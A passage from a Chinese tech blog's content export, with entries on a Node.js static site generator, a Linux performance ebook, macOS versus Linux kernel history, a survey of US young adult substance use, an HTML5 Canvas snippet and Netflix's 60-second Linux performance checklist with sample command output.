"stylesheets": ["./css/style.css"], "scripts": ["./js/main.js"], "charset": "utf-8", "description": "This is a page", "keywords": "page, sample", "author": "None", "favicon": "./images/favicon.png", "viewport": "width=device-width, initial-scale=1", "extra": []&#125; Step 3: 编写模板和构建脚本（template &amp; build Script）代码生成器中需要定制开发的部分包括 builder.js 和 pages_template.js。build.js 相当于 main 函数，控制入口和流程，加载资源数据、调用 generator 任务，与 Makefile 和 Ant.xml 非常类似。pages_template.js 依赖的组件是 markdown-it ，负责将 Markdown 源文件转换输出成 HTML 文件。builder.js 将 pages_template.js 视为一个模块引用：pageTemplate.generatePage(pageContent, metaData)) 因此可以根据需要定制多个不同的 XXX_template.js 或者在每个 template.js 中定义其它函数。 builder.js 1234567891011121314151617181920212223242526272829303132333435363738394041var pageTemplate = require('./page_template');// All paths are relative to package.json.var pagesPath = './pages';var pagesMetaPath = './pages_meta';var copyFolders = ['./images', './css', './js'];var outputPath = './build';// Cleanconsole.log('Cleaning previous build...');for (var file of fs.readdirSync(outputPath))&#123; fs.removeSync(path.join(outputPath, file));&#125;//Loadingconsole.log('Loading pages metadata...'); for(var pageMeta of fs.readdirSync(pagesMetaPath))&#123; pagesMeta[pageMeta] = fs.readFileSync(path.join(pagesMetaPath,pageMeta),'utf8'); &#125;&#125;// Generateconsole.log('Generating pages...');for(var page of Object.entries(pages)) &#123; var pageName = page[0].slice(0, page[0].lastIndexOf('.')); var metaData = pagesMeta.hasOwnProperty(pageName+'.json') ? JSON.parse(pagesMeta[pageName+'.json']) : &#123;&#125;; metaData.title = metaData.title || pageName; var pageContent = page[1]; fs.writeFileSync( path.join(outputPath,pageName+'.html'), pageTemplate.generatePage(pageContent, metaData)); &#125;&#125;// Copyconsole.log('Copying folders...'); for(var copyFolder of copyFolders)&#123; fs.copySync(copyFolder, path.join(outputPath,copyFolder)); &#125; pages_template.js1234567891011121314151617181920var md = require('markdown-it')();module.exports = &#123; generatePage: function(pageContent,pageMeta)&#123; return`&lt;!DOCTYPE html&gt;&lt;html lang="$&#123;pageMeta.lang || this.defaultMeta.lang&#125;"&gt; &lt;head&gt; &lt;title&gt;$&#123;pageMeta.title || this.defaultMeta.title&#125;&lt;/title&gt; &lt;meta charset="$&#123;pageMeta.charset || this.defaultMeta.charset&#125;"&gt; &lt;meta name="description" content="$&#123;pageMeta.description || this.defaultMeta.description&#125;"&gt; &lt;meta name="keywords" content="$&#123;pageMeta.keywords || this.defaultMeta.keywords&#125;"&gt; &lt;meta name="author" content="$&#123;pageMeta.author || this.defaultMeta.author&#125;"&gt;&lt;/head&gt;&lt;body&gt; $&#123;md.render(pageContent)&#125;&lt;/body&gt;&lt;/html&gt; `; &#125;&#125; Step 4: 优化任务脚本在 Step 1 步骤中，npm init 创建了一个文件：package.json，我们可以定义其中的 “scripts” , 执行 npm run start 将默认在 1080 端口开启 Web 服务。 1234567891011&#123; "name": "coffee", "version": "1.0.0", "description": "beyond my coffee", "main": "index.js", "scripts": &#123; "build-pages": "node ./build_scripts/builder.js", "start": "concurrently --kill-others \"nodemon -e js,json,css,md -i build -x \\\"npm run build-pages\\\"\" \"live-server ./build\"" &#125;, "author": "@RiboseYim"&#125; 1234567891011121314151617181920212223242526272829303132333435363738$ npm run build-pages&gt; coffee@1.0.0 build-pages /generator-code&gt; node ./build_scripts/builder.jsCleaning previous build...Loading pages...Loading pages metadata...Generating pages...Copying folders...Done!$ npm run start&gt; coffee@1.0.0 start /Users/yanrui/project/generator-code&gt; concurrently --kill-others "nodemon -e js,json,css,md -i build -x \"npm run build-pages\"" "live-server ./build"[0] [nodemon] 1.14.1[0] [nodemon] to restart at any time, enter `rs`[0] [nodemon] watching: *.*[0] [nodemon] starting `npm run build-pages`[1] Serving "./build" at http://127.0.0.1:8080[1] Ready for changes[1] GET /js/main.js 404 42.133 ms - 23[1] GET /js/main.js 404 12.204 ms - 23[0][0] &gt; coffee@1.0.0 build-pages /Users/yanrui/project/generator-code[0] &gt; node ./build_scripts/builder.js[0][0] Cleaning previous build...[0] Loading pages...[0] Loading pages metadata...[0] Generating pages...[0] Copying folders...[0] Done![0] [nodemon] clean exit - waiting for changes before restart[1] Change detected build/index.html[1] Change detected build/images 扩展阅读 玩转编程语言系列 参考文献 Building a simple static page generator with Node.js]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电子书：《Linux Perf Master》]]></title>
    <url>%2F2017%2F12%2F21%2FeBook-LPM%2F</url>
    <content type="text"><![CDATA[摘要 我的第一本电子书 GitBook 工具链 Amazon 上架 简介《The Linux Perf Master》(暂用名) 是一本关于开源软件的电子书。本书与常见的专题类书籍不同，作者以应用性能诊断入手，尝试从多个不同的维度介绍以 Linux 操作系统为核心的开源架构技术体系。全书分为以下几个部分：第一部分：性能诊断入门。介绍 Linux 性能诊断的入门方法，包括资源利用评估、性能监控、性能优化等工作涉及的工具和方法论，以 Stack Overflow 为例介绍一个真实的应用系统架构组成；第二部分：基础设施管理工具。介绍 Ganglia,Ntop,Graphite,Ansible,Puppet,SaltStack 等基础设施管理 &amp; 可视化工具；第三部分：操作系统工作原理。介绍 Linux 操作系统工作原理（Not only Works,But Also How），从动态追踪技术的角度理解应用程序与系统行为；第四部分：通信协议与网络工程。介绍基于 TCP/IP 协议的负载均衡技术，封包过滤技术和态势感知技术；微服务之后的挑战：分布式追踪系统（Planning);第五部分：信息安全篇。介绍木马入侵、黑客攻击、防护与检测，IPv6 、容器等技术发展对安全工作的挑战；介绍信息安全法律；第六部分：工程管理篇。尝试跳出 IT 视野讨论人才培养，DevOps 组织、效率和工程管理方法；第七部分：社区文化篇。介绍黑客文化、开源作者、开发者社区和知识产权法，“技术首先是关于人的”（Technology is first about human beings）。 背景：我的第一本电子书2016年7月份我已经提到，希望能实现一个小目标：出版一本专业书籍。目标虽小，实现不易。参阅了众多老司机的成功经验，我决定还是先整理一本电子书出来。《Linux Perf Master》Edition 0.1 在 2017-02-10 首次发布于 GitBook 平台，主题以 Linux 性能为核心，覆盖评估诊断、监控、优化的工具和方法论，还补充了几个参考案例。该书编辑过程中，早期没有使用 Markdown 发表的文章，没办法做到一键复用，必须再次进行繁琐的排版。另外，个人也不推荐使用编辑器：GitBook Editor for Mac ，它使用起来不太友好，也很容易崩溃。也不推荐在本地搭建一套自己的GitBook服务端，对个人用户来说过于繁琐。我的方式是“本地编写+自动同步”的方式：Git + Markdown真是珠联璧合、威力无穷。更多细节请查看：我的写作工具链（持续更新）。 GitBook 地址 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details Amazon 上架 缺少资源：代理人 国内出版 缺少资源：出版社 《Linux Perf Master》：Edition 1.0 | 2016 | 电子工业出版社 | 选题阶段枪毙 GitBook 访问数据 时间点 订阅用户数 Downloads Unique visitors Page Views 说明 201701 —– —– —– —– GitBook Edition 0.1 20170630 135 4,206 4,936 —– GitBook Edition 0.2 20170830 154 4,503 5,989 23,505 —– 20170930 157 4,553 6,471 24,944 —– 20171230 187 4,821 7,708 29,052 GitBook Edition 0.3 下载国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。 Edition 0.4 20180714 Edition 0.3 20171225 Edition 0.2 20170701 Edition 0.1 20170210 历史版本基本原则：持续发布，争取做到每四个月发布一个新版本 Edition 0.4 20180714 mod “网络工程篇”调整为分布式系统专题 mod Pcap、sFlow 调整到Cyber-Security专题 add 应用监控与可视化;LinkedIn Kafka Monitor add 应用监控与可视化;2018 Docker 用户报告 add PostgreSQL 数据库 add 案例：基于 Kafka 的事件溯源型微服务 add 分布式追踪系统体系概要 add 开源分布式跟踪系统 OpenCensus add 从作坊到工厂的寓言故事 add 基础设施标准化：部署和配置管理 add macOS vs Linux Kernels ？ add IT 工程师养生指南 Edition 0.3 20171225 修订 Linux 快速性能诊断三篇、gRPC 监控数据可视化：Graphite、GIS How Linux Works:内存管理 调整部分章节顺序 Edition 0.2 20170701 Linux 入门命令100条 How Linux Works: Kernel Space &amp; User Space Init 动态追踪技术：strace,gdb,ftrace,bcc,BPF 基于数据分析的网络态势感知 Cyber-Security:IPv6,Web Headers,香港CSTCB Edition 0.1 20170210 第一个 GitBook 版本，主要为 2016 年内容合辑 基于Linux单机负载评估 新一代Ntopng网络流量监控—可视化和架构分析 基于LVS的AAA负载均衡架构实践 Linus Torvalds: The mind behind Linux 读者反馈信息 csdn.net /@faxiang1230,2017-04-231)没有一个主题进行深入地分析2)各个主题对某一个问题进行分析,还不错]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>SRE</tag>
        <tag>最佳写作实践</tag>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:基于Golang构建网络数据爬虫]]></title>
    <url>%2F2017%2F12%2F21%2FLanguage-Go-lang-Spider%2F</url>
    <content type="text"><![CDATA[摘要 数据可视化（五）基于网络爬虫制作数据可视化图表 初级爬虫数据可视化（五）基于网络爬虫制作数据可视化图表 图表数据可视化技术方案 基于网络爬虫的可视化图表 案例：最近十年全国彩票销售变化情况 在线演示 案例：中国科学院院士分布（出生地与籍贯）在线演示 案例：美国航空入境旅客（出发地）变化情况 在线演示 中高级爬虫 User Agent IP Ajax 数据 登录 验证码 扩展阅读 玩转编程语言系列 参考文献 开源爬虫项目列表 Package pdf Scheduler of spiders for scraping and parsing HTML and JSON pages]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[嗑药简史：美国青年人群药物滥用情况]]></title>
    <url>%2F2017%2F12%2F20%2FAddiction-Decision-2016-USA-Students%2F</url>
    <content type="text"><![CDATA[摘要 美国 NIDA : 2016 年度青年人群药物滥用调查报告 2017 年 9月，美国 NIDA 公布了一份针对全美青年人群的药物和酒精滥用情况的调查报告。监测人群选取 2016 年的准大学生及其同龄青年，大学生组（college students，Full-Time）和非大学生组（non-college）。 以下数据来源：美国卫生和公众服务部·国立卫生研究院·国家药物滥用研究所Source: National Institute on Drug Abuse; National Institutes of Health; U.S. Department of Health and Human Services. 大麻（Marijuana Use）在这个年龄段，吸食大麻（Marijuana Use）的情况令人担忧。吸食大麻的比例是 20 世纪 80 年代初以来的最高水平，有 4.9% 的大学生和 12.8% 的非大学生报告在日常生活中会吸食大麻。 酒精（Heavy Alcohol Use ）大学生群体的酗酒比例似乎比非大学组的比例高。 狂饮（Binge drinking，连续五杯以上）：32.4% 的大学生和 28.7% 的非大学生在过去的 2 周内有狂饮经历。 酒精中毒（Intoxication，醉酒、酗酒）：40.8% 的大学生和 30.4% 的非大学生在过去一个月内有酗酒经历。 烟草/尼古丁（Nicotine Use）大学生人群中烟草（尼古丁）的使用率普遍较低。 香烟（Cigarettes）：8.9% 的大学生和 18.8% 的非大学生在过去一个月使用香烟。 电子烟（E-vaporizers，通过雾化等手段将尼古丁等变成蒸汽后让用户吸食）：9% 的大学生和 6.9% 的非大学生过去一个月使用过电子烟。电子烟可能包括尼古丁，其他药物或非药物（例如调味剂等）。 水烟（Hookah）：大学生去年水烟使用的是较低的，16.9% 的大学生和 19.8% 非大学在过去一年中使用过水烟，大学生组的比例较低。在过去的五年中，水烟在大学生人群中的使用率呈现下降趋势。水烟使用率从 2011 年的27.9% 下降到 2016 年的 16.9% 。 安非他命（ Amphetamine Misuse）大学生的安非他命药物滥用（ Amphetamine Misuse）情况似乎要比同龄的非大学生人群比例高。 大学生似乎有较高的安非他明滥用率，他们强调使用这些药物可以用来提高学习成绩。然而，并没有证据表明这些物质能长期提高学习效率。过去一年中，2.4% 的大学生和 1.6% 的非大学生使用利他林（Ritalin，中枢神经兴奋剂）。9.9% 的大学生和 6.2% 的非大学生使用阿得拉（Adderall，一种治疗注意力缺失/多动症的药物）。 扩展阅读：《嗑药简史》嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)参考文献 NIDA:Drug and Alcohol Use in College-Age Adults in 2016 Schulenberg, JE, Johnston LD, O’Malley PM, Bachman JG, Meich RA, Patrick ME. Monitoring the Future national survey results on drug use, 1975-2016: Volume 2, College students and adults ages 19-55. Ann Arbor: Institute for Social Research, The University of Michigan, 2017. Adderall 在期末带来的效用真的那么神奇吗？ 纽约时报：那些在美国大学里痛苦挣扎的中国留学生 纽约时报：幻灭的美国梦：中国留学生因何命丧大麻交易 Economist:Teenagers are better behaved and less hedonistic nowadaystechnology has probably changed people’s behaviour. Teenagers are heavy internet users, the more so as they acquire smartphones. By their own account, 15-year-olds in OECD countries spent 146 minutes a day online on weeknights in 2015, up from 105 minutes in 2012. Chileans lead the rich world, putting in an average of 195 minutes on weekdays and 230 minutes on weekend days.]]></content>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Manager</tag>
        <tag>数据可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谁是王者：macOS vs Linux Kernels ？]]></title>
    <url>%2F2017%2F12%2F19%2FLinux-Win-Mac%2F</url>
    <content type="text"><![CDATA[谁是王者：macOS vs Linux Kernels ？ Mac 快键键 谁是王者：macOS vs Linux Kernels ？有些人可能认为 macOS 和 Linux 内核是类似的系统, 因为它们看起来可以处理类似的命令和软件。有些人甚至认为苹果的 macOS 是基于 Linux 的。事实上, 这两个内核各有特色，也都有不同寻常的历史。 命令行 操作 Linux Mac Windows 查看二进制文件 ldd otool -L —- 查看网卡 ifconfig ifconfig ipconfig 查看网络路由 route -n / netstat -ar netstat -ar route PRINT 查看网络连接 netstat -an netstat -an netstat -an 动态链接库 ldconfig update_dyld_shared_cache —- hosts /etc/hosts//private/etc/hosts —– debug strace dtruss —– macOS Kernel 简史我们首先从 macOS Kernel 的历史开始讲起。1985年, 史蒂夫·乔布斯（ Steve Jobs）离开苹果公司（Apple ）并创办了一家新的计算机公司：NeXT 。乔布斯快速向市场推出了一款新型电脑 (搭载新操作系统) 。为了节省时间, NeXT 团队使用了 Mach kernel（ 来自卡内基·梅隆大学，是最早实现微核心操作系统的例子之一，是许多其它相似的项目的标准，在分布式与并行运算领域应用广泛) 和 部分 BSD 代码库, 创建了 NeXTSTEP 操作系统。具有讽刺意味的是，早期 Mach 只是服务于操作系统研究，曾经的开发目标甚至是取代 BSD ，目前 Mach 的研究至今似乎是停止了，但是许多商业化操作系统，特别是 Mac OS X 及其它派生系统却活得很滋润。 在商业上，NeXT 公司从来没有获得成功, 部分原因是乔布斯的花钱习惯仍然像他在苹果公司一样大手大脚。与此同时, 苹果公司多次尝试更新自己的操作系统, 但是包括与 IBM 合作在内、一直未取得成功。1997年, 苹果公司以 4 亿 2900 万美元收购了 NeXT 公司 。作为交易的一部分, 史蒂夫·乔布斯重新回到苹果, NeXTSTEP 操作系统也成为了 macOS 和 iOS 操作系统的基础。值得注意的是，NeXT 团队的另一项成果 WebObjects 后来集成到了 Mac OS X Server 和 Xcode 中。 Linux Kernel 简史与 macOS Kernel 不同, Linux 从一开始不是作为商业计划的一部分而创建的。相反, Linux 在 1991 年由芬兰计算机专业的学生林纳斯·托瓦兹（Linus Torvalds）创建。最初 Linux 内核代码是按照林纳斯个人的计算机规格编写, 因为他想利用自己电脑上搭载的新式 80386 处理器。林纳斯在 1991 年 8 月将他编写的操作系统内核代码发布到网络上。不久, 他收到了来自世界各地爱好者贡献的代码和建议。第二年, Orest Zborowski 将 X Windows 系统移植到 Linux 中, 使其能够支持图形用户界面。 在过去的 27 年里, Linux 已经慢慢成长壮大，它不再是一个学生的业余项目。目前，Linux 运行在世界上大多数的计算设备和超级计算机上。 他在旧版的SketchPad代码基础上进行了修改，让它运行在Macintosh上，并改名MacSketch。SketchPad通过菜单的方式选取图案和样式，Bill把它们放到屏幕下方，变成固定的调色板，并在屏幕左边另外增加一组调色板，包含了各种各样的绘图工具。后续还会不断增加新的工具，不过MacPaint早期的基本架构已经就此成形。—— 《硅谷革命：成就苹果公司的疯狂往事》 macOS Kernel 特色macOS kernel 的特色官方总结为: XNU。意思是 “XNU 不是 Unix”。根据苹果的 Github 页面, XNU 是 “一个混合内核, 奠基于卡耐基·梅隆大学开发的 Mach kernel , 它的组件来自 FreeBSD 和用于编写驱动程序的 C++ API “。BSD 子系统部分的代码 “通常作为微核心系统中实现用户空间服务”。Mach 部分的代码则负责较底层的工作, 例如多任务（multitasking）、内存保护（ protected memory）、虚拟内存管理（virtual memory management）、支持内核调试（kernel debugging）和控制台 I/O 。 Mach 的虚拟内存（VM）系统也被 BSD 的开发者用于 CSRG ，并出现在 BSD 派生的系统中，如 FreeBSD ，但是无论 macOS 还是 FreeBSD 都并未保留 Mach 首倡的微核心结构，除了 macOS 继续提供微核心于内部处理通信以及应用程序直接控制之外。 他在旧版的SketchPad代码基础上进行了修改，让它运行在Macintosh上，并改名MacSketch。SketchPad通过菜单的方式选取图案和样式，Bill把它们放到屏幕下方，变成固定的调色板，并在屏幕左边另外增加一组调色板，包含了各种各样的绘图工具。后续还会不断增加新的工具，不过MacPaint早期的基本架构已经就此成形。———《硅谷革命：成就苹果公司的疯狂往事》 Linux Kernel 特色如果说 macOS 内核的特点是结合了微核心 (microkernel ，Mach) 和宏内核 (monolithic kernel ，BSD)，那么 Linux 则仅仅是一个宏内核。宏内核负责管理 CPU、内存、进程间通信、设备驱动程序、文件系统和系统服务调用。 一句话总结macOS 内核代码 (XNU) 基于两个甚至包含古老代码基的组合。另一方面, Linux 的历史更短, 它从头开始编写并且应用广泛。 预测未来的最佳方式就是创造未来。—— 个人电脑之父 艾伦·凯(Alan Kay) Mac 快键键1234567891011⌘——Command ()⌃ ——Control⌥——Option (alt)⇧——Shift⇪——Caps Lockfn——功能键 扩展阅读：电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（三）：网络管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 Difference Between the macOS and Linux Kernels What is Mac OS X? Linkedin:Orest Zborowski Linux Networking/A brief history of Linux Networking Kernel Development]]></content>
      <tags>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Visualization-Canvas]]></title>
    <url>%2F2017%2F12%2F19%2FVisualization-Canvas%2F</url>
    <content type="text"><![CDATA[摘要待编辑 HTML5 标签用于绘制图像（通过脚本，通常是 JavaScript）。不过， 元素本身并没有绘制能力（它仅仅是图形的容器） ，您必须使用脚本来完成实际的绘图任务。 Canvas 的默认大小为300像素×150像素（宽×高，像素的单位是px）。但是，可以使用HTML的高度和宽度属性来自定义Canvas 的尺寸。为了在 Canvas 上绘制图形，我们使用一个JavaScript上下文对象，它能动态创建图像（ creates graphics on the fly）。 1&lt;canvas id="canvas"&gt;&lt;/canvas&gt; 12345var canvas = document.getElementById('canvas');var ctx = canvas.getContext('2d');ctx.fillStyle = 'green';ctx.fillRect(10, 10, 100, 100); 资源 An HTML 5 Canvas API :IRIS Worm is a real-time data graphing component 参考文献 HTML 5 Canvas 参考手册]]></content>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断:快速检查单(Netflix版)]]></title>
    <url>%2F2017%2F12%2F11%2FLinux-Perf-Netflix%2F</url>
    <content type="text"><![CDATA[摘要 快速检查单QRH 请大家记住这样一个思路：先把大石头移开。大石头移开后，中等大小的石头可能就显现出来了。性能调优的原则就是先解决大问题，然后解决剩余问题中的大问题。在解决了大问题后，通常隐藏在它背后的问题也会暴露出来。也就是说，解决了前面的瓶颈后，下一个瓶颈就显现出来了。—— 《图解性能优化》 快速检查单快速检查单（Quick Reference Handbook，QRH）是飞行员在飞行过程中依赖的重要指导性文件。 第一张飞行检查单起源于一次严重的航空事故。1935年波音公司研制的一架新型轰炸机在试飞过程中突然坠机，导致2名机组人员遇难——包括一名最优秀的试飞员普洛耶尔·希尔少校。后来的调查结果分析，事故并不是机械故障引起的，而是人为失误造成。新型飞机比以往的飞机更复杂，飞行员要管理4台发动机，操控起落架、襟翼、电动配平调整片和恒速液压变距螺旋桨等。因为忙于各种操作，希尔少校忘记了一项简单却很重要的工作 —— 在起飞前忘记对新设计的升降舵和方向舵实施解锁。 美国军方组织飞行专家编制了一份飞行检查单，将起飞、巡航、着陆和滑行各阶段的重要步骤写在一张索引卡片上。飞行员根据检查单的提示检查刹车是否松开，飞行仪表是否准确设定，机舱门窗是否完全关闭，升降舵等控制面是否已经解锁。 Netflix 性能工程团队登陆一台 Linux 服务器排查性能问题：开始一分钟你该检查哪些呢？在 Netflix 我们有一个庞大的 EC2 Linux集群，也有许多性能分析工具用于监视和检查它们的性能。它们包括用于云监测的Atlas (工具代号) ，用于实例分析的 Vector (工具代号) 。尽管这些工具能帮助我们解决大部分问题，我们有时也需要登陆一台实例、运行一些标准的 Linux 性能分析工具。在这篇文章，Netflix 性能工程团队将向您展示：在开始的60秒钟，利用标准的Linux命令行工具，执行一次充分的性能检查。 Linux 性能分析黄金60秒运行以下10个命令，你可以在60秒内，获得系统资源利用率和进程运行情况的整体概念。查看是否存在异常、评估饱和度，它们都非常易于理解，可用性强。饱和度表示资源还有多少负荷可以让它处理，并且能够展示请求队列的长度或等待的时间。 123456uptimedmesg | tail vmstat 1mpstat -P ALL 1 pidstat 1iostat -xz 1 free -msar -n DEV 1sar -n TCP,ETCP 1 top 这些命令需要安装sysstat包。这些命令输出的指标，将帮助你掌握一些有效的方法：一整套寻找性能瓶颈的方法论。这些命令需要检查所有资源的利用率、饱和度和错误信息（CPU、内存、磁盘等）。同时，当你检查或排除一些资源的时候，需要注意在检查过程中，根据指标数据指引，逐步缩小目标范围。 接下来的章节，将结合生产环境的案例演示这些命令。如果希望了解这些工具的详细信息，可以查阅它们的操作文档。 1. uptime12$ uptime23:51:26up21:31, 1user, loadaverage:30.02,26.43,19.02 这是一个快速查看平均负载的方法，表示等待运行的任务（进程）数量。在Linux系统中，这些数字包含等待CPU运行的进程数，也包括不间断I/O阻塞的进程数（通常是磁盘I/O）。它展示了一个资源负载（或需求）的整体概念，但是无法理解其中的内涵，在没有其它工具的情况下。仅仅是一种快速查看手段而已。 这三个数字呈现出平均负载在几何级减弱，依次表示持续1分钟，5分钟和15分钟内。这三个数字能告诉我们负载在时间线上是如何变化的。举例说明，如果你在一个问题服务器上执行检查，1分钟的值远远低于15分钟的值，可以判断出你也许登录得太晚了，已经错过了问题。 在上面的例子中，平均负载的数值显示最近正在上升，1分钟值高达30，对比15分钟值则是19。这些指标值像现在这么大意味着很多情况：也许是CPU繁忙；vmstat 或者 mpstat 将可以确认，本系列的第三和第四条命令。 2. dmesg | tail12345678$ dmesg | tail[1880957.563150] perl invoked oom-killer: gfp_mask=0x280da, order=0, oom_score_adj=0[...][1880957.563400] Out of memory: Kill process 18694 (perl) score 246 or sacrifice child[1880957.563408] Killed process 18694 (perl) total-vm:1972392kB, anon-rss:1953348kB, file-rss:0kB[2320864.954447] TCP: Possible SYN flooding on port 7001. Dropping request. Check SNMP counters. 这个结果输出了最近10条系统信息。可以查看到引起性能问题的错误。上面的例子包含了oom-killer,以及TCP丢包。 译者注:除了error级的日志，info级的也要留个心眼，可能包含一些隐藏信息。 3. vmstat 112345678$ vmstat 1procs ---------memory---------- ---swap-- -----io---- -system-- ------cpu-----r b swpd free buff cache si so bi bo in cs us sy id wa st34 0 0 200889792 73708 591828 0 0 0 5 6 10 96 1 3 0 032 0 0 200889920 73708 591860 0 0 0 592 13284 4282 98 1 1 0 032 0 0 200890112 73708 591860 0 0 0 0 9501 2154 99 1 0 0 032 0 0 200889568 73712 591856 0 0 0 48 11900 2459 99 0 0 0 032 0 0 200890208 73712 591860 0 0 0 0 15898 4840 98 1 1 0 0 vmstat 是一个获得虚拟内存状态概况的通用工具（最早创建于10年前的BSD）。它每一行记录了关键的服务器统计信息。vmstat 运行的时候有一个参数1，用于输出一秒钟的概要数据。第一行输出显示启动之后的平均值，用以替代之前的一秒钟数据。现在，跳过第一行，让我们来学习并且记住每一列代表的意义。 r：正在CPU上运行或等待运行的进程数。相对于平均负载来说，这提供了一个更好的、用于查明CPU饱和度的指标，它不包括I/O负载。注: “r”值大于CPU数即是饱和。 free: 空闲内存（kb)如果这个数值很大，表明你还有足够的内存空闲。包括命令7“free m”，很好地展现了空闲内存的状态。 si, so: swap入／出。如果这个值非0，证明内存溢出了。 us, sy, id, wa, st:它们是CPU分类时间，针对所有CPU的平均访问。分别是用户时间，系统时间（内核），空闲，I/O等待时间，以及被偷走的时间（其它访客，或者是Xen）。CPU分类时间将可以帮助确认，CPU是否繁忙，通过累计用户系统时间。等待I/O的情形肯定指向的是磁盘瓶颈；这个时候CPU通常是空闲的，因为任务被阻塞以等待分配磁盘I/O。你可以将等待I/O当作另一种CPU空闲，一种它们为什么空闲的解释线索。 系统时间对I/O处理非常必要。一个很高的平均系统时间，超过20%，值得深入分析：也许是内核处理I/O非常低效。在上面的例子中，CPU时间几乎完全是用户级的，与应用程序级的利用率正好相反。所有CPU的平均利用率也超过90%。这不一定是一个问题；还需检查“r”列的饱和度。 4. mpstat P ALL 1123456789$ mpstat -P ALL 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)07:38:49 PM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle07:38:50 PM all 98.47 0.00 0.75 0.00 0.00 0.00 0.00 0.00 0.00 0.7807:38:50 PM 0 96.04 0.00 2.97 0.00 0.00 0.00 0.00 0.00 0.00 0.9907:38:50 PM 1 97.00 0.00 1.00 0.00 0.00 0.00 0.00 0.00 0.00 2.0007:38:50 PM 2 98.00 0.00 1.00 0.00 0.00 0.00 0.00 0.00 0.00 1.0007:38:50 PM 3 96.97 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 3.03[...] 这个命令可以按时间线打印每个CPU的消耗，常常用于检查不均衡的问题。如果只有一个繁忙的CPU，可以判断是属于单进程的应用程序。 5. pidstat 112345678910111213141516$ pidstat 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)07:41:02 PM UID PID %usr %system %guest %CPU CPU Command07:41:03 PM 0 9 0.00 0.94 0.00 0.94 1 rcuos/007:41:03 PM 0 4214 5.66 5.66 0.00 11.32 15 mesos-slave07:41:03 PM 0 4354 0.94 0.94 0.00 1.89 8 java07:41:03 PM 0 6521 1596.23 1.89 0.00 1598.11 27 java07:41:03 PM 0 6564 1571.70 7.55 0.00 1579.25 28 java07:41:03 PM 60004 60154 0.94 4.72 0.00 5.66 9 pidstat07:41:03 PM UID PID %usr %system %guest %CPU CPU Command07:41:04 PM 0 4214 6.00 2.00 0.00 8.00 15 mesos-slave07:41:04 PM 0 6521 1590.00 1.00 0.00 1591.00 27 java07:41:04 PM 0 6564 1573.00 10.00 0.00 1583.00 28 java07:41:04 PM 108 6718 1.00 0.00 0.00 1.00 0 snmp-pass07:41:04 PM 60004 60154 1.00 4.00 0.00 5.00 9 pidstat^C pidstat 有一点像顶级视图－针对每一个进程，但是输出的时候滚屏，而不是清屏。它非常有用，特别是跨时间段查看的模式，也能将你所看到的信息记录下来，以利于进一步的研究。上面的例子识别出两个 java 进程引起的CPU耗尽。“％CPU” 是对所有CPU的消耗；1591% 显示 java 进程占用了几乎16个CPU。 6. iostat xz 1123456789101112$ iostat -xz 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)avg-cpu: %user %nice %system %iowait %steal %idle73.96 0.00 3.73 0.03 0.06 22.21Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %utilxvda 0.00 0.23 0.21 0.18 4.52 2.08 34.37 0.00 9.98 13.80 5.42 2.44 0.09xvdb 0.01 0.00 1.02 8.94 127.97 598.53 145.79 0.00 0.43 1.78 0.28 0.25 0.25xvdc 0.01 0.00 1.02 8.86 127.79 595.94 146.50 0.00 0.45 1.82 0.30 0.27 0.26dm-0 0.00 0.00 0.69 2.32 10.47 31.69 28.01 0.01 3.23 0.71 3.98 0.13 0.04dm-1 0.00 0.00 0.00 0.94 0.01 3.78 8.00 0.33 345.84 0.04 346.81 0.01 0.00dm-2 0.00 0.00 0.09 0.07 1.35 0.36 22.50 0.00 2.55 